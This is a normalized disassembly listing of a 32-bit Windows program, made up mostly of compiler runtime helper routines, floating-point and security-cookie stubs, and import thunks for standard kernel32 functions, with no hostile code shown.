push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e49
mov edi edi
push ebp
mov ebp esp
push 0xc
push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e5c
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e6f
mov edi edi
push ebp
mov ebp esp
push 0x7
push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e82
mov edi edi
push ebp
mov ebp esp
push 0xc
push [ ebp + 0x8 ]
call sub_439ec5
pop ecx
pop ecx
pop ebp
retn
sub_439e95
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_439ea5
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_439eb7
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_439ebf
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_439f01
mov eax [ ecx ]
retn
sub_43a1e2
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_43a1ea
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_43a42e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43a43e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43a44e
push [ ecx ]
call sub_43a5a0
pop ecx
retn
sub_43a457
mov eax [ ecx ]
retn
sub_43a45a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x8 ]
cmp eax ecx
sbb eax eax
and eax ecx
pop ebp
retn
sub_43a46d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_43a8f0
push 0x4
call sub_42f0c3
pop ecx
retn
sub_43b358
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
or [ esi ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn
sub_43bc1c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43bc27
sub_43bc94
mov eax [ rw-data ]
retn
sub_43bc9a
call [ GetProcessHeap@IAT ]
test eax eax
mov [ rw-data ] eax
setne al
retn
sub_43bcab
and [ rw-data ] 0x0
mov al 0x1
retn
sub_43bcb5
mov eax [ rw-data ]
retn
sub_43bd8b
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_43bdf1
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_43be25
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_43be5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43be6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43be7e
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_43be87
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_43be9a
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_43bf2c
push 0x3
call sub_42f0c3
pop ecx
retn
sub_43c01d
mov eax ecx
retn
sub_43c07b
call sub_430a7e
add eax 0x4
retn
sub_43c244
cmp [ ebp - 0x1d ] 0x0
je r-xdata
retn
push 0x3
call sub_42f0c3
pop ecx
sub_43c426
push 0x3
call sub_42f0c3
pop ecx
retn
sub_43ca2e
push 0x1f80
call sub_444df6
pop ecx
retn
sub_43cfeb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
and eax 0xfff7ffff
push eax
push [ ebp + 0x8 ]
call sub_43cce9
pop ecx
pop ecx
pop ebp
retn
sub_43d248
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43d688
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_438db5
pop ecx
retn
sub_43d6bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43d6ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43d6de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43d6f0
push [ ecx ]
call sub_438cfe
pop ecx
retn
sub_43d74e
push [ ecx ]
call sub_438db5
pop ecx
retn
sub_43db1b
retn
sub_43e4ea
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43db1c
add esp 0xc
pop ebp
retn
sub_43e537
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43dc7c
sub_43e5b3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dbcc
add esp 0xc
pop ebp
retn
sub_43e600
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43dd48
sub_43ea6c
push esi
call sub_438db5
pop ecx
retn
sub_43eb6d
push edi
call sub_438db5
pop ecx
retn
sub_43ed32
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43e9aa
sub_43ed3d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43eb9a
sub_43ed48
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43ea95
add esp 0x10
pop ebp
retn
sub_43edd0
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f0c3
pop ecx
retn
sub_43ee04
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43ee16
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43ee26
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_43ee38
push [ ecx ]
call sub_42f07b
pop ecx
retn
sub_43ee41
mov eax [ ecx ]
movzx eax [ eax ]
push eax
call sub_43ee74
pop ecx
retn
sub_43ee4e
push [ ecx ]
call sub_42f0c3
pop ecx
retn
sub_43ef9b
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43efb1
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43efe4
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f043
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f056
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f06c
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f07f
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f095
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f0a8
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f0bb
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f0ce
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f0e4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_43ef62
pop ecx
pop ecx
pop ebp
retn
sub_43f0f7
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f10d
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f123
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_43f154
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f167
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f17a
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f190
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f1a3
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f1b9
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f1cc
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f1df
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f1f2
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
sub_43f208
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_440810
mov [ ecx ] 0x0
mov eax ecx
retn
sub_440843
cmp [ ecx + 0x8 ] 0x0
je r-xdata
retn
push ecx
call sub_44607a
pop ecx
sub_440990
mov edi edi
push ebp
mov ebp esp
bsr ecx [ ebp + 0x8 ]
je r-xdata
mov eax 0x20
pop ebp
retn
mov eax 0x1f
sub eax ecx
pop ebp
retn
sub_440e60
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] eax
sete al
pop ebp
retn
sub_441380
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mul [ ebp + 0x10 ]
add edx ecx
pop ebp
retn
sub_442fe8
fxch st1
fstp st0
retn
sub_442ff6
fstp st0
fldz
retn
sub_442ffb
fstp st0
fstp st0
fldz
test ch ch
je r-xdata
retn
fchs
sub_443008
fstp st0
fstp st0
fld1
retn
sub_44300f
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
fadd [ r--data ]
retn
mov [ ebp - 0x90 ] 0x0
retn
sub_44303a
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_4430a3
fstp st0
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_4430b6
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_4430c0
fstp st0
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
or cl cl
je r-xdata
fchs
retn
fld [ r--data ]
fmulp st1
sub_4430dd
or cl cl
je r-xdata
retn
fchs
sub_4430e4
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov [ rw-data ] ecx
pop ebp
retn
sub_443204
push 0xa
call IsProcessorFeaturePresent
mov [ rw-data ] eax
xor eax eax
retn
sub_443240
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_44325e
leave
retn
sub_443258
movlpd xmm0 [ esp + 0x4 ]
sub_4433f0
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_443405
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_44341c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x0
retn
mov eax 0x0
retn
sub_443478
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_4435e0
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_4435fe
leave
retn
sub_4435f8
movlpd xmm0 [ esp + 0x4 ]
sub_4437a8
retn
sub_443cdb
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_443c2a
sub_443d30
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_443d47
add esp 0xc
pop ebp
retn
sub_443dd4
call sub_437a77
xor ecx ecx
test al al
sete cl
mov eax ecx
retn
sub_444ac0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4445e3
add esp 0x14
pop ebp
retn
sub_444afc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444642
add esp 0x14
pop ebp
retn
sub_444d5d
cmp [ rw-data ] 0x1
push esi
jl r-xdata
xor esi esi
call sub_444dd8
mov esi eax
and esi 0x3f
call sub_444db9
jmp r-xdata
mov eax esi
pop esi
retn
sub_444db9
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jl r-xdata
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
sub_444e25
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_444e6c
mov edi edi
push ebp
mov ebp esp
call sub_444dd8
mov ecx [ ebp + 0x8 ]
and ecx 0x3f
or eax ecx
push eax
call sub_444df6
pop ecx
pop ebp
retn
sub_444e87
cmp [ rw-data ] 0x1
jl r-xdata
xor eax eax
retn
call sub_444dd8
and eax 0x3f
retn
sub_444e9c
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_444f36
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_445011
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_444f48
pop ecx
pop ecx
pop ebp
retn
sub_445290
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_438db5
pop ecx
retn
sub_4452c4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_4452da
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4452ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_445341
push [ ecx ]
call sub_438cfe
pop ecx
retn
sub_44534a
push [ ecx ]
call sub_438db5
pop ecx
retn
sub_445bcd
push esi
call sub_438db5
pop ecx
retn
sub_44600b
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_44602a
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_446777
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fadd [ ebp + 0x10 ]
pop ebp
retn
sub_447480
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_44749e
leave
retn
sub_447498
movlpd xmm0 [ esp + 0x4 ]
j_sub_443008#2
jmp sub_443008
sub_447778
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_4477a4
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ r--data ]
retn
sub_4477b4
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_4477b9
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_4430a3
fyl2x
retn
sub_4477bd
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_4430a3
fyl2x
retn
j_sub_443008
jmp sub_443008
sub_447809
fstp st0
jmp r-xdata
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_44783f
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_447851
or cl cl
jne r-xdata
jmp sub_442ff6
fstp st0
fld [ r--data ]
retn
sub_447ac3
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0xe ]
shr eax 0x4
and eax 0x7ff
sub eax 0x3fe
cwde
pop ebp
retn
sub_447d27
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447dd7
mov edi edi
push ebp
mov ebp esp
mov edx 0x7ff0
xor eax eax
mov ecx edx
and cx [ ebp + 0xe ]
cmp cx dx
setne al
pop ebp
retn
sub_447f9c
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_4481bc
add esp 0x10
pop ebp
retn
sub_447fbb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_447fd5
add esp 0xc
pop ebp
retn
sub_4481bc
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_4481db
add esp 0x10
pop ebp
retn
sub_4485e1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_448336
sub_4485ec
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_44843d
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
InitializeSListHead
jmp [ InitializeSListHead@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
InterlockedPushEntrySList
jmp [ InterlockedPushEntrySList@IAT ]
InterlockedFlushSList
jmp [ InterlockedFlushSList@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
LoadLibraryExW
jmp [ LoadLibraryExW@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetModuleHandleExW
jmp [ GetModuleHandleExW@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetACP
jmp [ GetACP@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
GetDateFormatW
jmp [ GetDateFormatW@IAT ]
GetTimeFormatW
jmp [ GetTimeFormatW@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
EnumSystemLocalesW
jmp [ EnumSystemLocalesW@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
OutputDebugStringA
jmp [ OutputDebugStringA@IAT ]
OutputDebugStringW
jmp [ OutputDebugStringW@IAT ]
WaitForSingleObjectEx
jmp [ WaitForSingleObjectEx@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileExA
jmp [ FindFirstFileExA@IAT ]
FindFirstFileExW
jmp [ FindFirstFileExW@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindNextFileW
jmp [ FindNextFileW@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
SetEnvironmentVariableA
jmp [ SetEnvironmentVariableA@IAT ]
SetEnvironmentVariableW
jmp [ SetEnvironmentVariableW@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
SetFilePointerEx
jmp [ SetFilePointerEx@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ReadConsoleW
jmp [ ReadConsoleW@IAT ]
SystemFunction036
jmp [ SystemFunction036@IAT ]
sub_4489f9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_448a61
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_448a76
mov ecx [ ebp - 0x10 ]
xor ecx ebp
sub_40c38e
sub_448a61
sub_448a87
mov ecx [ ebp - 0x14 ]
xor ecx ebp
sub_40c38e
sub_448a61
sub_448c69
mov ecx [ ebp - 0x1c ]
xor ecx ebp
sub_40c38e
sub_40d2b6
sub_448dc0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40c3a0
sub_448dd6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40c3a0
sub_448f75
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov eax ecx
pop ebp
retn
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_44bf02
int3
sub_44c230
push 0x318
mov eax [ ebp + 0x8 ]
push eax
call sub_40c377
add esp 0x8
retn
sub_44c242
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
sub_44c260
push 0x318
mov eax [ ebp - 0x1028 ]
push eax
call sub_40c377
add esp 0x8
retn
sub_44c275
lea ecx [ ebp - 0x1024 ]
jmp sub_401b30
sub_44c280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1038 ]
xor ecx eax
call sub_40c38e
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
sub_44c2b0
mov ecx [ ebp - 0x10 ]
jmp sub_404e10
sub_44c2b8
push 0x7e0
mov eax [ ebp - 0x14 ]
push eax
call sub_40c377
add esp 0x8
retn
sub_44c2ca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
sub_44c2f0
push 0x7e0
mov eax [ ebp - 0x10 ]
push eax
call sub_40c377
add esp 0x8
retn
sub_44c302
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
sub_44c320
push 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_40c377
add esp 0x8
retn
sub_44c32f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
sub_44c34a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40c38e
mov eax r--data
jmp sub_40d8bf
